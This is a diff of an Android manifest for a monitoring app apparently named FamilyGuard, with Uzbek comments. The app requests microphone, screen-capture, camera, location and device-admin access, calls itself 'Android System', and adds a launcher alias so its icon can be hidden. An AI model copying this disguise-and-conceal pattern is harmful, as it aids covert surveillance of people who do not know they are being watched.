@@ -1,5 +1,6 @@
 <manifest xmlns:android="http://schemas.android.com/apk/res/android"
           xmlns:tools="http://schemas.android.com/tools">
+
   <uses-permission android:name="android.permission.INTERNET"/>
   <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
   <uses-permission android:name="android.permission.CAMERA"/>
@@ -18,8 +19,8 @@
   <uses-permission android:name="android.permission.PACKAGE_USAGE_STATS"
       tools:ignore="ProtectedPermissions"/>
   <uses-permission android:name="android.permission.SCHEDULE_EXACT_ALARM"/>
-          <uses-permission android:name="android.permission.POST_NOTIFICATIONS"/>
-<uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS"/>
+  <uses-permission android:name="android.permission.POST_NOTIFICATIONS"/>
+  <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS"/>
   <uses-permission android:name="android.permission.USE_EXACT_ALARM"/>
 
   <application android:theme="@style/Theme.Child" android:label="Android System">
@@ -28,13 +29,13 @@
         android:name=".AudioRecordingService"
         android:exported="false"
         android:stopWithTask="false"
-        android:foregroundServiceType="microphone" />
+        android:foregroundServiceType="microphone"/>
 
     <service
         android:name=".ScreenCaptureService"
         android:exported="false"
-              android:stopWithTask="false"
-        android:foregroundServiceType="mediaProjection|camera|location" />
+        android:stopWithTask="false"
+        android:foregroundServiceType="mediaProjection|camera|location"/>
 
     <receiver android:name=".DeviceAdminReceiver"
       android:label="Android System"
@@ -58,30 +59,36 @@
       </intent-filter>
     </receiver>
 
-    <!-- Watchdog — har 3 daqiqada tekshiruvchi -->
-    <receiver android:name=".WatchdogReceiver"
-        android:exported="false"/>
+    <receiver android:name=".WatchdogReceiver" android:exported="false"/>
 
-    <activity android:name=".MainActivity" android:exported="true">
+    <!-- MainActivity — intent-filter YO'Q, alias orqali ochiladi -->
+    <activity android:name=".MainActivity" android:exported="true"/>
+
+    <!-- Ikonka uchun alias — shu yashiriladi/ko'rsatiladi -->
+    <activity-alias
+        android:name=".LauncherAlias"
+        android:targetActivity=".MainActivity"
+        android:exported="true"
+        android:enabled="true"
+        android:label="Android System">
       <intent-filter>
         <action android:name="android.intent.action.MAIN"/>
         <category android:name="android.intent.category.LAUNCHER"/>
       </intent-filter>
-    </activity>
+    </activity-alias>
 
-<!-- Accessibility Service — screenshot uchun -->
-<service
-    android:name=".FamilyGuardAccessibilityService"
-    android:exported="true"
-    android:label="Android System"
-    android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
-    <intent-filter>
+    <service
+        android:name=".FamilyGuardAccessibilityService"
+        android:exported="true"
+        android:label="Android System"
+        android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
+      <intent-filter>
         <action android:name="android.accessibilityservice.AccessibilityService"/>
-    </intent-filter>
-    <meta-data
-        android:name="android.accessibilityservice"
-        android:resource="@xml/accessibility_service"/>
-</service>
+      </intent-filter>
+      <meta-data
+          android:name="android.accessibilityservice"
+          android:resource="@xml/accessibility_service"/>
+    </service>
 
   </application>
 </manifest>
